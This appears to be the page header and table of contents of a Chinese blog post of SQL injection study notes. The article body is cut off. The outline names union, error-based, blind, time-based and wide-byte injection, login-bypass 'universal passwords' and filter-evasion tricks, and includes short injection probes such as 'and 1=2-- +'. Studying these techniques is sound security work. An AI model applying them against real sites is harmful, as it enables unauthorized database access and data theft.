<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SQL注入学习笔记1 | 一只小白</title><meta name="description" content="一、字符型和数字型注入1. and or 操作符1.1 简述  and和or属于运算符，主要用途是把多个条件结合起来，过滤sql语句的返回结果。主要用在where语句中。 1.2 作用 可以起到一个条件连接的作用，尤其是在盲注时 当注释符被过滤，还可以使用and加上一个retu条件，闭合单引号  1.3 andand 又叫与运算,当两个条件都为真时，返回真，否则为假。格式：条件1 adn 条件2实"><meta name="keywords" content="SQL注入"><meta name="author" content="XiaoPu"><meta name="copyright" content="XiaoPu"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="SQL注入学习笔记1"><meta name="twitter:description" content="一、字符型和数字型注入1. and or 操作符1.1 简述  and和or属于运算符，主要用途是把多个条件结合起来，过滤sql语句的返回结果。主要用在where语句中。 1.2 作用 可以起到一个条件连接的作用，尤其是在盲注时 当注释符被过滤，还可以使用and加上一个retu条件，闭合单引号  1.3 andand 又叫与运算,当两个条件都为真时，返回真，否则为假。格式：条件1 adn 条件2实"><meta name="twitter:image" content="https://img.xpctf.cn/img/20200530144523.png"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入学习笔记1"><meta property="og:url" content="https://www.xpctf.cn/posts/c70/"><meta property="og:site_name" content="一只小白"><meta property="og:description" content="一、字符型和数字型注入1. and or 操作符1.1 简述  and和or属于运算符，主要用途是把多个条件结合起来，过滤sql语句的返回结果。主要用在where语句中。 1.2 作用 可以起到一个条件连接的作用，尤其是在盲注时 当注释符被过滤，还可以使用and加上一个retu条件，闭合单引号  1.3 andand 又叫与运算,当两个条件都为真时，返回真，否则为假。格式：条件1 adn 条件2实"><meta property="og:image" content="https://img.xpctf.cn/img/20200530144523.png"><meta property="article:published_time" content="2020-06-17T11:49:39.000Z"><meta property="article:modified_time" content="2021-09-02T06:37:35.422Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = 'false'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://www.xpctf.cn/posts/c70/"><link rel="prev" title="SQL注入学习笔记2" href="https://www.xpctf.cn/posts/d106/"><link rel="next" title="Linux国内更新源-通用" href="https://www.xpctf.cn/posts/295e/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.xpctf.cn/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: true
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 5.4.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">47</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">37</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">一、字符型和数字型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-and-or-%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-text">1. and or 操作符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E7%AE%80%E8%BF%B0"><span class="toc-text">1.1 简述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E4%BD%9C%E7%94%A8"><span class="toc-text">1.2 作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-and"><span class="toc-text">1.3 and</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-or"><span class="toc-text">1.4 or</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-text">2. MySQL注释符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E4%BD%9C%E7%94%A8"><span class="toc-text">2.1 作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E5%8D%95%E8%A1%8C%E6%B3%A8%E9%87%8A"><span class="toc-text">2.2 单行注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E5%A4%9A%E8%A1%8C%E6%B3%A8%E9%87%8A"><span class="toc-text">2.3 多行注释</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3. 数字型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E5%8A%A0%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-text">3.1 加单引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E5%8A%A0and-1-1"><span class="toc-text">3.2 加and 1&#x3D;1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E5%8A%A0and-1-2"><span class="toc-text">3.3 加and 1&#x3D;2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-%E9%98%B2%E5%BE%A1%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.4 防御数字型注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">4. 字符型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E5%8A%A0%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-text">4.1 加单引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E5%8A%A0-%E2%80%99and-1-1"><span class="toc-text">4.2 加 ’and 1&#x3D;1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-%E5%8A%A0%E2%80%98and-1-2%E2%80%93"><span class="toc-text">4.3 加‘and 1&#x3D;2– +</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">4.4 万能密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-%E9%98%B2%E5%BE%A1%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">4.5 防御字符型注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">二、union联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-union"><span class="toc-text">1. union</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-order-by"><span class="toc-text">2.order by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-information-schema%E5%BA%93"><span class="toc-text">3. information_schema库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-schemata%E8%A1%A8"><span class="toc-text">3.1 schemata表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-tables%E8%A1%A8"><span class="toc-text">3.2 tables表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-columns%E8%A1%A8"><span class="toc-text">3.3 columns表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">4. union联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">4.1 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E5%88%A4%E6%96%AD%E7%B1%BB%E5%9E%8B"><span class="toc-text">4.2 判断类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-%E7%8C%9C%E5%88%97%E6%95%B0"><span class="toc-text">4.3 猜列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-%E6%B5%8B%E5%9B%9E%E6%98%BE"><span class="toc-text">4.4 测回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-text">4.5 爆库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-text">4.6 爆表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-text">4.7 爆列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-text">4.8 爆数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">三、extractvalue报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">1. 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-xml%E5%9F%BA%E7%A1%80"><span class="toc-text">1.1 xml基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-extractvalue"><span class="toc-text">1.2 extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-updatexml"><span class="toc-text">1.3 updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-concat"><span class="toc-text">1.4 concat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-group-concat"><span class="toc-text">1.5 group_concat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-6-substr%E5%87%BD%E6%95%B0"><span class="toc-text">1.6 substr函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-7-%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-text">1.7 子查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2. extractvalue报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">2.1 确定注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">2.2 爆数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-text">2.3 爆表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-text">2.4 爆列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-%E6%8B%BF%E5%88%B0flag"><span class="toc-text">2.5 拿到flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">3. updatexml报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">3.1 爆数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-text">3.2 爆表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-text">3.3 爆字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-%E6%8B%BF%E5%88%B0flag"><span class="toc-text">3.4 拿到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">四、floor报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E5%87%BD%E6%95%B0"><span class="toc-text">1. 基础函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-floor%E5%87%BD%E6%95%B0"><span class="toc-text">1.1 floor函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-count%E5%87%BD%E6%95%B0"><span class="toc-text">1.2 count函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-group-by%E5%87%BD%E6%95%B0"><span class="toc-text">1.3 group by函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-rand%E5%87%BD%E6%95%B0"><span class="toc-text">1.4 rand函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-limit%E5%87%BD%E6%95%B0"><span class="toc-text">1.5 limit函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2. 主键重复报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">2.1 爆数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-text">2.2 爆表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-text">2.3 爆列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E6%8B%BF%E5%88%B0flag"><span class="toc-text">2.4 拿到flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-MySQL%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7"><span class="toc-text">3. MySQL的一些特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-name-const%E5%87%BD%E6%95%B0"><span class="toc-text">3.1 name_const函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-text">3.2 几何函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%9B%B2%E6%B3%A8"><span class="toc-text">五、盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E5%87%BD%E6%95%B0-1"><span class="toc-text">1. 基础函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-substr%E5%87%BD%E6%95%B0"><span class="toc-text">1.1 substr函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-if%E5%87%BD%E6%95%B0"><span class="toc-text">1.2 if函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-ascii%E5%87%BD%E6%95%B0"><span class="toc-text">1.3 ascii函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-length%E5%87%BD%E6%95%B0"><span class="toc-text">1.4 length函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-sleep%E5%87%BD%E6%95%B0"><span class="toc-text">1.5 sleep函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-6-benchmark%E5%87%BD%E6%95%B0"><span class="toc-text">1.6 benchmark函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">2. 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">2.1 猜数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E7%8C%9C%E8%A1%A8%E5%90%8D"><span class="toc-text">2.2 猜表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E7%8C%9C%E5%88%97%E5%90%8D"><span class="toc-text">2.3 猜列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E8%AF%BB%E5%8F%96flag"><span class="toc-text">2.4 读取flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-text">3. 延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">3.1 猜数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E7%8C%9C%E8%A1%A8%E5%90%8D"><span class="toc-text">3.2 猜表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E7%8C%9C%E5%88%97%E5%90%8D"><span class="toc-text">3.3 猜列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-%E6%8B%BFflag"><span class="toc-text">3.4 拿flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-text">3.5 数据库名长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81exp%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-text">六、exp报错盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B4%E6%95%B0%E8%8C%83%E5%9B%B4"><span class="toc-text">1. 整数范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-exp%E5%87%BD%E6%95%B0"><span class="toc-text">2.exp函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exp%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-text">3. exp报错盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">七、宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"><span class="toc-text">1. 字符编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-url%E7%BC%96%E7%A0%81"><span class="toc-text">1.1 url编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-GBK%E7%BC%96%E7%A0%81"><span class="toc-text">1.2 GBK编码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-3-utf8%E7%BC%96%E7%A0%81"><span class="toc-text">1.3 utf8编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">2. 宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E6%B5%8B%E8%AF%95%E5%9B%9E%E6%98%BE"><span class="toc-text">2.1 测试回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-text">2.2 爆库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E7%88%86%E8%A1%A8%E5%90%8D-1"><span class="toc-text">2.3 爆表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E7%88%86%E5%88%97%E5%90%8D-1"><span class="toc-text">2.4 爆列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-text">2.5 爆数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-text">八、各种绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">1. 空格过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">1.1 换行符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">1.2 注释符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">1.3 括号绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">2. 逗号过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-from-for%E7%BB%95%E8%BF%87"><span class="toc-text">2.1 from for绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-limit-offset%E7%BB%95%E8%BF%87"><span class="toc-text">2.2 limit offset绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-join%E7%BB%95%E8%BF%87"><span class="toc-text">2.4 join绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AD%89%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">3. 等于号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">3.1 大小于号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-strcmp%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-text">3.2 strcmp函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-in%E5%87%BD%E6%95%B0"><span class="toc-text">3.3 in函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-text">4. 异或注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E5%BC%82%E6%88%96"><span class="toc-text">4.1 异或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-payload%E5%88%86%E6%9E%90"><span class="toc-text">4.2 payload分析</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://img.xpctf.cn/img/20200530144523.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">一只小白</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">SQL注入学习笔记1</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-06-17 19:49:39"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-06-17</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" 